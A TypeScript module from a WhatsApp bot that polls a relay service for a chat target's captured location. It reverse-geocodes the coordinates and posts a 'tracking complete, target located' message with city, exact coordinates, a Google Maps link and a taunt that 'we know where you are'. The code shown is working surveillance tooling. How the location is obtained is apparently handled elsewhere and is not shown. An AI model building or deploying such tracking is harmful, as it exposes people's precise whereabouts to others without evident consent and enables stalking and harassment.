import { platformManager } from '../platforms/PlatformManager';
import logger from './loggerService';

const RELAY_URL = (process.env.RELAY_URL || 'https://bot-wpp-relay.onrender.com').trim();

let started = false;

export function startLocationPoller(intervalMs = 5000): void {
  if (started) return;
  started = true;

  const API_KEY = process.env.WARRIOR_AUTH_KEY || '';
  logger.info('[LocationPoller] Iniciando', {
    hasApiKey: !!API_KEY,
    apiKeyLength: API_KEY?.length || 0,
    intervalMs,
    relayUrl: RELAY_URL
  });

  if (!(global as any).pendingChatIds || typeof (global as any).pendingChatIds.add !== 'function') {
    (global as any).pendingChatIds = new Set<string>();
  }
  const pending = (global as any).pendingChatIds as Set<string>;

  setInterval(async () => {
    if (pending.size === 0) return;
    const chatIds = Array.from(pending);
    for (const chatId of chatIds) {
      try {
        const url = `${RELAY_URL}/pending/${encodeURIComponent(chatId)}`;
        const res = await fetch(url, {
          method: 'GET',
          headers: { 'x-api-key': API_KEY },
        });
        if (res.status === 204) continue;
        const data: any = await res.json().catch(() => null);
        if (!data || !data.location) continue;

        const loc = data;
        const lat = Number(loc.location.lat);
        const lng = Number(loc.location.lng);
        if (!Number.isFinite(lat) || !Number.isFinite(lng)) continue;

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;

        let groupName = '';
        try {
          const adapter = platformManager.getAdapter('whatsapp');
          if (adapter?.client?.getChat) {
            const cleanId = chatId.replace(/^wpp:/, '');
            const chat = await adapter.client.getChat(cleanId);
            groupName = (chat as any)?.name || '';
          }
        } catch (e: any) {
          logger.warn('[LocationPoller] getChat falhou', { chatId, error: e?.message });
        }

        let cidade = '';
        try {
          const geo = await fetch(
            `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=pt`,
            { method: 'GET' }
          );
          if (geo.ok) {
            const g: any = await geo.json().catch(() => null);
            if (g) {
              const partes = [g.city || g.locality, g.principalSubdivision, g.countryName].filter(Boolean);
              cidade = partes.join(', ');
            }
          }
        } catch { /* ignore */ }

        const accuracy = loc.location.accuracy ? `🎯 Precisão: ~${Math.round(loc.location.accuracy)}m` : '';

        const text = [
          '🕵️ *RASTREAMENTO CONCLUÍDO*',
          groupName ? `📍 Grupo: *${groupName}*` : '📍 *Alvo localizado*',
          cidade ? `🏙️ Cidade: ${cidade}` : '',
          `🌐 Coordenadas: ${lat}, ${lng}`,
          `🔗 ${mapsUrl}`,
          accuracy,
          '',
          '😎 A gente sabe de tudo de você... até onde você está agora. Relaxa, é só uma brincadeira. 👀',
        ].filter(Boolean).join('\n');

        const adapter = platformManager.getAdapter('whatsapp');
        if (adapter?.client?.sendMessage) {
          await adapter.client.sendMessage(chatId, text);
          logger.info('[LocationPoller] Localização enviada', {
            chatId,
            lat,
            lng,
            groupName: groupName || '-',
            cidade: cidade || '-'
          });
        }
        pending.delete(chatId);
      } catch (e: any) {
        logger.error('[LocationPoller] Erro ao processar localização', {
          chatId,
          error: e?.message,
          status: e?.response?.status,
          code: e?.code
        });
      }
    }
  }, intervalMs);
}